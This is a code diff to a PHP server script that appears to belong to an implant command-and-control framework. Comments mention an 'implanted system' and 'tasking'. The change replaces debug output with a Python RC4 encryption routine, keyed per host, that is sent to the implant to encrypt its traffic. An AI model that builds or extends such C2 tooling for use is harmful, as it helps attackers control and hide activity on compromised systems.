@@ -53,11 +53,15 @@
         # Echoes out encryption key and routine in the HTTP response
         # This is the only time this encryption key is exchanged
 
+
         # TO DO: This will echo out the encryption key, but I need to also echo out the encryption and decryption functions
         # Each line in the encrypt() and decrypt() functions needs two whitespaces or else it errors
         # TO DO: Removing debugging code and add in echo of Python RC4 encryption and decryption routines here
-        echo "def encrypt():\n  k = '" . $encryption_key . "'" . "\n  print 'this is the encryption routine'\n  print k\n";
-        echo "def decrypt():\n  k = '" . $encryption_key . "'" . "\n  print 'this is the decryption routine'\n  print k\n";
+        echo "def encrypt(data):\n  key = '" . $encryption_key . "'\n  S = range(256)\n  j = 0\n  out = []\n  for i in range(256):\n    j = (j + S[i] + ord(key[i % len(key)])) % 256\n    S[i] , S[j] = S[j] , S[i]\n  i = j = 0\n  for char in data:\n    i = ( i + 1 ) % 256\n    j = ( j + S[i] ) % 256\n    S[i] , S[j] = S[j] , S[i]\n    out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))\n  return ''.join(out)";
+
+        #echo "def decrypt():\n  k = '" . $encryption_key . "'" . "\n  print 'this is the decryption routine'\n  print k\n";
+
+
     }
     # Else old host
     else {
@@ -78,8 +82,8 @@
 
         # TO DO: This is just to show that the encryption key and routine are now stored in memory on the implanted system
         # "\n" is necessary to terminate the line
-        echo "encrypt()\n";
-        echo "decrypt()\n";
+        echo "encrypt('This is a test.')\n";
+        #echo "decrypt()\n";
 
         # If tasking found
         if ($row_count > "0") {
